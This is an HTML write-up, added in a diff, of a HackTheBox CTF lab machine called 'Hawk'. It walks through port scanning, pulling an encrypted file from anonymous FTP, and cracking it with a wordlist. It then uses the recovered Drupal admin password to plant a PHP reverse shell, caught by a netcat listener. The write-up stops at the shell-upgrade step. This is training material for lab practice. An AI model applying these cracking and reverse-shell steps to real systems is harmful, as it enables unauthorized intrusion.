@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Hawk</strong></h1>
+        <em>Released: 14th July 2018 / Pwned: 10th November 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Hawk is a fun box! It has a few steps, but none of them are too difficult.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Download an encrypted .txt from FTP<br>
+        • Bruteforce the encrypted .txt to find the drupal password<br>
+        • Login to Drupal and get a shell on the system by enabling PHP filter and creating a basic page<br>
+        • Elevate to daniel by reading /var/www/html/default/settings.php<br>
+        • Escape the python shell by importing pty and spawning /bin/bash<br>
+        • Remote port forward the H2 datbase console out to your attacking machine<br>
+        • Change the H2 databse URL to a writable directory on the target system<br>
+        • Use CREATE ALIAS and call your alias to execute code on the target system<br>
+        • Gain a shell as root by writing your ssh public key to root's authorized_keys file<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-all.txt 10.10.10.102</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p 21,22,80,5435,8082,9092 -T4 -sV -sC -O -oN nmap/tcp-open.txt 10.10.10.102</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mkdir&nbsp;nmap</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-all.txt&nbsp;10.10.10.102</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                21<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span><br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span><br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http<br>
+                5435<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;sceanics<br>
+                8082<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;blackice-alerts<br>
+                9092<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;XmlIpcRegSvc<br>
+                <br>
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;21,22,80,5435,8082,9092&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-open.txt&nbsp;10.10.10.102</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                21<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vsftpd&nbsp;3.0.3<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ftp-anon<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Anonymous&nbsp;FTP&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;allowed&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>FTP&nbsp;code&nbsp;230<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Jun&nbsp;16&nbsp;&nbsp;2018&nbsp;messages<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ftp-syst<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;STAT<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;FTP&nbsp;server&nbsp;status<span style="color:#ff9d00;font-weight:700">:</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connected&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">::</span>ffff<span style="color:#ff9d00;font-weight:700">:</span>10.10.14.7<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logged&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;as&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TYPE<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ASCII<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No&nbsp;session&nbsp;bandwidth&nbsp;limit<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Session&nbsp;timeout&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;seconds&nbsp;is&nbsp;300<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Control&nbsp;connection&nbsp;is&nbsp;plain&nbsp;text<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Data&nbsp;connections&nbsp;will&nbsp;be&nbsp;plain&nbsp;text<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;At&nbsp;session&nbsp;startup,&nbsp;client&nbsp;count&nbsp;was&nbsp;2<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vsFTPd&nbsp;3.0.3&nbsp;-&nbsp;secure,&nbsp;fast,&nbsp;stable<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_End&nbsp;of&nbsp;status<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.6p1&nbsp;Ubuntu&nbsp;4&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;Linux<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;protocol&nbsp;2.0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssh-hostkey<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;2048&nbsp;e4<span style="color:#ff9d00;font-weight:700">:</span>0c<span style="color:#ff9d00;font-weight:700">:</span>cb<span style="color:#ff9d00;font-weight:700">:</span>c5<span style="color:#ff9d00;font-weight:700">:</span>a5<span style="color:#ff9d00;font-weight:700">:</span>91<span style="color:#ff9d00;font-weight:700">:</span>78<span style="color:#ff9d00;font-weight:700">:</span>ea<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>96<span style="color:#ff9d00;font-weight:700">:</span>af<span style="color:#ff9d00;font-weight:700">:</span>4d<span style="color:#ff9d00;font-weight:700">:</span>03<span style="color:#ff9d00;font-weight:700">:</span>e4<span style="color:#ff9d00;font-weight:700">:</span>fc<span style="color:#ff9d00;font-weight:700">:</span>88&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;256&nbsp;95<span style="color:#ff9d00;font-weight:700">:</span>cb<span style="color:#ff9d00;font-weight:700">:</span>f8<span style="color:#ff9d00;font-weight:700">:</span>c7<span style="color:#ff9d00;font-weight:700">:</span>35<span style="color:#ff9d00;font-weight:700">:</span>5e<span style="color:#ff9d00;font-weight:700">:</span>af<span style="color:#ff9d00;font-weight:700">:</span>a9<span style="color:#ff9d00;font-weight:700">:</span>44<span style="color:#ff9d00;font-weight:700">:</span>8b<span style="color:#ff9d00;font-weight:700">:</span>17<span style="color:#ff9d00;font-weight:700">:</span>59<span style="color:#ff9d00;font-weight:700">:</span>4d<span style="color:#ff9d00;font-weight:700">:</span>db<span style="color:#ff9d00;font-weight:700">:</span>5a<span style="color:#ff9d00;font-weight:700">:df</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ECDSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;256&nbsp;4a<span style="color:#ff9d00;font-weight:700">:</span>0b<span style="color:#ff9d00;font-weight:700">:</span>2e<span style="color:#ff9d00;font-weight:700">:</span>f7<span style="color:#ff9d00;font-weight:700">:</span>1d<span style="color:#ff9d00;font-weight:700">:</span>99<span style="color:#ff9d00;font-weight:700">:</span>bc<span style="color:#ff9d00;font-weight:700">:</span>c7<span style="color:#ff9d00;font-weight:700">:</span>d3<span style="color:#ff9d00;font-weight:700">:</span>0b<span style="color:#ff9d00;font-weight:700">:</span>91<span style="color:#ff9d00;font-weight:700">:</span>53<span style="color:#ff9d00;font-weight:700">:</span>b9<span style="color:#ff9d00;font-weight:700">:</span>3b<span style="color:#ff9d00;font-weight:700">:</span>e2<span style="color:#ff9d00;font-weight:700">:</span>79&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ED25519<span style="color:#ff9d00;font-weight:700">)</span><br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.29&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-generator<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Drupal&nbsp;7&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>http<span style="color:#ff9d00;font-weight:700">://</span>drupal.org<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;http-robots.txt<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;36&nbsp;disallowed&nbsp;entries&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>15&nbsp;shown<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>includes<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>misc<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>modules<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>profiles<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>scripts<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>themes<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>CHANGELOG.txt&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>cron.php&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>INSTALL.mysql.txt&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>INSTALL.pgsql.txt&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>INSTALL.sqlite.txt&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>install.php&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>INSTALL.txt&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_<span style="color:#ff9d00;font-weight:700">/</span>LICENSE.txt&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>MAINTAINERS.txt<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.4.29&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Welcome&nbsp;to&nbsp;192.168.56.103&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;192.168.56.103<br>
+                5435<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;tcpwrapped<br>
+                8082<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;H2&nbsp;database&nbsp;http&nbsp;console<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;H2&nbsp;Console<br>
+                9092<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;XmlIpcRegSvc?<br>
+                <br>
+                Aggressive&nbsp;OS&nbsp;guesses<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Linux&nbsp;3.2&nbsp;-&nbsp;4.9&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>95%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;Linux&nbsp;3.16&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>95%<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        Analysis:<br>
+        • <code>21/ftp</code> - Anonymous login is enabled, so should be the first place you check.<br>
+        • <code>22/ssh</code> - Nothing to do here, but useful to know for later.<br>
+        • <code>80/http</code> - A drupal website, and probably the 2nd place for us to check.<br>
+        • <code>8082/http</code> - A h2 database console which isn't open to the public.<br>
+        • <code>5435</code> &amp; <code>9092</code> - Two unknown ports<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 21/ftp</strong></h2><br>
+        FTP contains a messages folder storing an openssl encrypted <code>.drupal.txt</code> file.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/ftp</span>]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ftp&nbsp;10.10.10.102</span><br>
+                Connected&nbsp;to&nbsp;10.10.10.102.<br>
+                220&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>vsFTPd&nbsp;3.0.3<span style="color:#ff9d00;font-weight:700">)</span><br>
+                Name&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>10.10.10.102<span style="color:#ff9d00;font-weight:700">:</span>root<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;anonymous<br>
+                230&nbsp;Login&nbsp;successful.<br>
+                Remote&nbsp;system&nbsp;<span style="color:#ff9d00;font-weight:700">type</span>&nbsp;is&nbsp;UNIX.<br>
+                Using&nbsp;binary&nbsp;mode&nbsp;to&nbsp;transfer&nbsp;files.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.&nbsp;Consider&nbsp;using&nbsp;PASV.<br>
+                150&nbsp;Here&nbsp;comes&nbsp;the&nbsp;directory&nbsp;listing.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;&nbsp;&nbsp;3&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Jun&nbsp;16&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;&nbsp;&nbsp;3&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Jun&nbsp;16&nbsp;&nbsp;2018&nbsp;..<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Jun&nbsp;16&nbsp;&nbsp;2018&nbsp;messages<br>
+                226&nbsp;Directory&nbsp;send&nbsp;OK.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;messages<br>
+                250&nbsp;Directory&nbsp;successfully&nbsp;changed.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.&nbsp;Consider&nbsp;using&nbsp;PASV.<br>
+                150&nbsp;Here&nbsp;comes&nbsp;the&nbsp;directory&nbsp;listing.<br>
+                226&nbsp;Directory&nbsp;send&nbsp;OK.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.&nbsp;Consider&nbsp;using&nbsp;PASV.<br>
+                150&nbsp;Here&nbsp;comes&nbsp;the&nbsp;directory&nbsp;listing.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Jun&nbsp;16&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;&nbsp;&nbsp;3&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Jun&nbsp;16&nbsp;&nbsp;2018&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;240&nbsp;Jun&nbsp;16&nbsp;&nbsp;2018&nbsp;.drupal.txt.enc<br>
+                226&nbsp;Directory&nbsp;send&nbsp;OK.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;get&nbsp;.drupal.txt.enc<br>
+                local<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;.drupal.txt.enc&nbsp;remote<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;.drupal.txt.enc<br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.&nbsp;Consider&nbsp;using&nbsp;PASV.<br>
+                150&nbsp;Opening&nbsp;BINARY&nbsp;mode&nbsp;data&nbsp;connection&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;.<span style="color:#7f0044;font-weight:400">drupal</span>.txt.enc&nbsp;(240&nbsp;bytes).<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                240&nbsp;bytes&nbsp;received&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;0.00&nbsp;secs&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>1.8165&nbsp;MB<span style="color:#ff9d00;font-weight:700">/</span>s<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        base64 decode the file and crack it with <code>bruteforce-salted-openssl</code> and <code>rockyou.txt</code>.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/ftp</span>]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cat&nbsp;.drupal.txt.enc&nbsp;|&nbsp;base64&nbsp;-d&nbsp;&gt;&nbsp;drupal.txt.enc.b64d</span><br>
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/ftp</span>]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#bruteforce-salted-openssl&nbsp;-t&nbsp;6&nbsp;-f&nbsp;/usr/share/wordlists/rockyou.txt&nbsp;drupal.txt.enc.b64d&nbsp;-d&nbsp;sha256</span><br>
+                Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;using&nbsp;dictionary&nbsp;mode,&nbsp;ignoring&nbsp;options&nbsp;-b,&nbsp;-e,&nbsp;-l,&nbsp;-m&nbsp;and&nbsp;-s.<br>
+                <br>
+                Tried&nbsp;passwords<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;27<br>
+                Tried&nbsp;passwords&nbsp;per&nbsp;second<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;inf<br>
+                Last&nbsp;tried&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;121212<br>
+                <br>
+                Password&nbsp;candidate<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;friends
+            </div>
+        </div><br>
+        <br>
+        The password is <code>friends</code>!<br>
+        Decrypt the file with <code>openssl</code>.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/ftp</span>]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#openssl&nbsp;enc&nbsp;-aes-256-cbc&nbsp;-d&nbsp;-in&nbsp;drupal.txt.enc.b64d&nbsp;-out&nbsp;drupal.txt</span><br>
+                enter&nbsp;aes-256-cbc&nbsp;decryption&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;friends<br>
+                ***&nbsp;WARNING&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;deprecated&nbsp;key&nbsp;derivation&nbsp;used.<br>
+                Using&nbsp;-iter&nbsp;or&nbsp;-pbkdf2&nbsp;would&nbsp;be&nbsp;better.<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/ftp</span>]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cat&nbsp;drupal.txt</span><br>
+                Daniel,<br>
+                <br>
+                Following&nbsp;the&nbsp;password&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">the</span>&nbsp;portal:<br>
+                <br>
+                PencilKeyboardScanner123<br>
+                <br>
+                Please&nbsp;let&nbsp;us&nbsp;know&nbsp;when&nbsp;the&nbsp;portal&nbsp;is&nbsp;ready.<br>
+                <br>
+                Kind&nbsp;Regards,<br>
+                <br>
+                IT&nbsp;department
+            </div>
+        </div><br>
+        <br>
+        We now have a password for Drupal - <code>PencilKeyboardScanner123</code><br>
+        We also have a potential username - <code>Daniel</code><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 80/http - Drupal</strong></h2><br>
+        Navigate to <code>http://10.10.10.102</code> and log in with the password we found:<br>
+        <code>admin / PencilKeyboardScanner123</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Get Shell</strong></h1>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) Create basic page -&gt; inject PHP code</strong></h3><br>
+        As <code>admin</code>, we can use the Drupal dashboard to get a shell on the system.<br>
+        <br>
+        Navigate to <code>Modules</code> and enable PHP filter.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        Start a listener on your attacking machine to receive your shell<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>hawk]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9001</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Select <code>Add content</code> and <code>Create Basic Page</code>, and change the <code>Text format</code> at the bottom of the page to <code>PHP code</code><br>
+        Here you can insert php code now that we've enabled PHP filter module.<br>
+        I inserted a reverse shell.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        Click <code>Save</code>, and you should see a shell on your listener.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.7]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.102]&nbsp;48672<br>
+                <span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        If your shell dies, you can acces it again from <code>Content</code> &gt; <code>Find content</code>.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc to daniel</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>3) Upgrade shell</strong></h2><br>
